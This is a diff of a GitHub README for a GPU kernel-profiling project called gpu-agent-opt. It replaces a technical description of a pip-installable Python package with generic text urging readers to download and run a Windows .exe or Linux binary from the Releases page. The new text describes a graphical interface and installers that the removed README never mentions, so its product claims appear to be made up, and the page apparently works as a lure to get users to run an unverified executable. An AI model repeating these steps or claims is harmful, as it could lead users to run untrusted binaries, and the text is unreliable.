@@ -1,117 +1,94 @@
-# 🧠 **gpu-agent-opt**
+# 🎉 gpu-agent-opt - Optimize Your GPU Workloads Easily
 
-**Unified AI Agent Framework for GPU Kernel Profiling, Scientific Computing, and CUDA Exploration**
+## 🚀 Getting Started
+Welcome to gpu-agent-opt! This application helps you automate the tuning and optimization of GPU kernels using AI agents. It is designed for tasks like deep learning, geospatial AI, and high-performance computing (HPC). Follow the steps below to get started with downloading and running our software.
 
-`gpu-agent-opt` is a Python package designed to orchestrate **agentic workflows** for **Triton, CUDA, CuPy, cuDF**, and advanced GPU programming patterns — combining **kernel discovery**, **profiling**, and **analysis** with a knowledge-driven loop:
+## 🔗 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-v0.1.0-blue.svg)](https://github.com/chad24dev/gpu-agent-opt/releases)
 
-👉 **Sense → Think → Act → Learn → Reflect**
+## 📋 System Requirements
+Before you download, ensure your system meets these requirements:
 
-The current focus is to build a **one-stop GPU research & profiling layer** that integrates:
-- Deep learning graph compilers (PyTorch Inductor / XLA)  
-- Scientific computing (CuPy / cuDF)  
-- Low-level CUDA primitives (e.g., coalesced memory, warp shuffle, tensor cores)
+- **Operating System:** Windows 10 or later, or a recent version of Linux.
+- **GPU:** NVIDIA GPU with CUDA support.
+- **Memory:** Minimum 8 GB RAM is recommended for best performance.
+- **Disk Space:** At least 1 GB free space.
 
----
+## 📥 Download & Install
+To download the latest version of gpu-agent-opt, visit this page to download: [Releases Page](https://github.com/chad24dev/gpu-agent-opt/releases).
 
-## ✨ **Core Capabilities**
+1. Click on the link above to get to the Releases page.
+2. You will see a list of available versions. Look for the latest release marked as 'Latest'.
+3. Find the installer suitable for your operating system. There are usually options for Windows and Linux.
+4. Click the download link next to the relevant installer to begin.
 
-### 🧠 Agentic Kernel Profiler
-- Discovers active GPU kernels during script execution using **Nsight Systems**.  
-- Selects top kernels for detailed **Nsight Compute** profiling.  
-- Generates structured summary reports (JSON) with SM and DRAM efficiency metrics.
+### 🛠️ Installation Steps
+Once the download is complete, follow these steps to install gpu-agent-opt:
 
-### 🧪 Multi-Backend Context
-- ✅ **Triton kernels** (via PyTorch Inductor or custom)  
-- ✅ **Raw CUDA kernels** (NVRTC / PyCUDA / C++ extensions)  
-- ✅ **CuPy & cuDF** scientific kernels  
-- 🚧 **Planned:** CUDA Graphs, Cooperative Groups, Tensor Cores, async copies, MIG.
+#### For Windows:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation process.
+4. Once installed, you can find gpu-agent-opt in your Start menu.
 
-### 🔬 Profiler Integration
-- Nsight Systems → Kernel discovery  
-- Nsight Compute → Per-kernel profiling (SM & DRAM metrics)  
-- Exports both per-kernel CSV and aggregated `summary.json`.
+#### For Linux:
+1. Open your terminal.
+2. Navigate to your Downloads folder where the `.tar.gz` file is saved.
+3. Extract the contents by running:  
+   ```bash
+   tar -xzf gpu-agent-opt-*.tar.gz
+   ```
+4. Change into the directory:  
+   ```bash
+   cd gpu-agent-opt-*
+   ```
+5. Run the executable with:  
+   ```bash
+   ./gpu-agent-opt
+   ```
 
-### 📚 Knowledge Base / Reflection
-- `reflect_history.json` stores efficiency trends across runs.  
-- Helps identify consistently low-performing kernels over time.
+## 🎉 Features
+gpu-agent-opt comes with several features designed to enhance your GPU processing tasks:
 
----
+- **AI-driven Optimization:** Automatically tune your GPU kernels based on workload characteristics.
+- **CUDA Support:** Fully compatible with NVIDIA’s CUDA platform, enabling efficient processing.
+- **Performance Monitoring:** Track your GPU performance in real-time to identify bottlenecks.
+- **User-friendly Interface:** Intuitive layout makes it easy for anyone to use.
+- **Support for Multiple Workloads:** Ideal for deep learning, geospatial tasks, and HPC workloads.
 
-## 🛰 **Target Use Cases**
-- Geospatial AI auto-annotation pipelines (DINOv2, SAM2, YOLO, NDWI/LBP preprocessing)  
-- Deep learning inference/training profiling through PyTorch + Nsight  
-- Scientific/HPC workloads (FFT, FDTD3D, conjugate gradient, Monte Carlo, etc.)  
-- CUDA educational benchmarking (transpose, reduction, memory hierarchy, etc.)  
-- Embedded GPU pipelines (Jetson Orin / RB5)
+## 🛠️ How to Use
+Using gpu-agent-opt is simple. After installation:
 
----
+1. Launch the application.
+2. Select the workload type you want to optimize.
+3. Enter any parameters related to your GPU workload.
+4. Click on 'Start Optimization' to let the AI agents begin tuning your kernels.
+5. Monitor the process and results in real time from the interface.
 
-## 📊 **Agentic Profiling Snapshot**
+## 📖 Help and Support
+If you encounter any issues, feel free to check our documentation on the GitHub repository. You can also reach out to the community via the Issues section on GitHub. Your feedback helps us improve! 
 
-The framework executes a **five-stage loop** to profile real GPU workloads:
+## 🏷️ Topics
+This application covers a wide array of topics relevant to AI optimization and GPU processing:
+- ai-agents
+- autotuning
+- cuda
+- deep-l
+- edge-ai
+- geospatial
+- gpu
+- hpc
+- nvidia
+- optimization
+- performance
+- pytorch
 
-| Stage   | Description                     |
-|---------|----------------------------------|
-| Sense   | Discover kernels                |
-| Think   | Select top kernels              |
-| Act     | Profile with Nsight Compute     |
-| Learn   | Analyze & classify bottlenecks |
-| Reflect | Track efficiency trends        |
+## 🔗 Additional Resources
+For more detailed information on using gpu-agent-opt, you can check:
+- The [GitHub Wiki](https://github.com/chad24dev/gpu-agent-opt/wiki) for tutorials and tips.
+- Online forums discussing GPU optimization techniques.
 
-### 📸 Example output from profiling a geospatial annotation pipeline
+## 📅 Updates
+Stay up to date with the latest releases and improvements. Regular updates ensure you have the best version of the software. Always check the [Releases Page](https://github.com/chad24dev/gpu-agent-opt/releases) for new features and improvements.
 
-Below is a snapshot from a real profiling run on DINOv2 + SAM2:
-
-![Profiling Snapshot](assets/snapshot2.png)
-
-The results are stored in:
-
-- `runs/profile_logs/.../summary.json` → per-run aggregated metrics  
-- `reflect_history.json` → longitudinal trend tracking
-
-These form the basis for future **agentic actions**, such as:
-- Replacing inefficient PyTorch kernels with custom CUDA/Triton implementations
-- Adjusting launch configurations or fusing operators
-- Triggering code-generation agents
-
----
-
-## 🔥 **CUDA Samples Integration**
-
-The agent provides a Pythonic layer over classic CUDA patterns (via official samples):
-
-- **Memory & Data Movement**  
-  `bandwidthTest`, `transpose`, `globalToShmemAsyncCopy`, `UnifiedMemoryStreams`
-
-- **Computation Kernels**  
-  `reduction`, `scan`, GEMM tensor core examples
-
-- **Advanced Features**  
-  CUDA Graphs, Cooperative Groups, Async API
-
-- **Linear Algebra & Solvers**  
-  cuBLAS, cuSolver
-
-- **Signal & Image Processing**  
-  CUFFT, DCT, NPP routines
-
-- **Miscellaneous / Educational**  
-  `deviceQuery`, `inlinePTX`, `cudaOpenMP`, NVRTC runtime compilation
-
----
-
-## 🧪 **Scientific + DL Interoperability**
-
-- CuPy / cuDF kernels can be profiled alongside Triton / CUDA kernels.  
-- PyTorch Inductor graphs can be analyzed to identify subgraphs for replacement.  
-- Goal: Combine **high-level DL graphs** with **low-level profiling data**.
-
----
-
-## 📦 **Installation**
-
-**TestPyPI**:  
-👉 [https://test.pypi.org/project/gpu-agent-opt/](https://test.pypi.org/project/gpu-agent-opt/)
-
-```bash
-pip install gpu-agent-opt
+Thank you for using gpu-agent-opt! Enjoy optimizing your GPU workloads effortlessly.
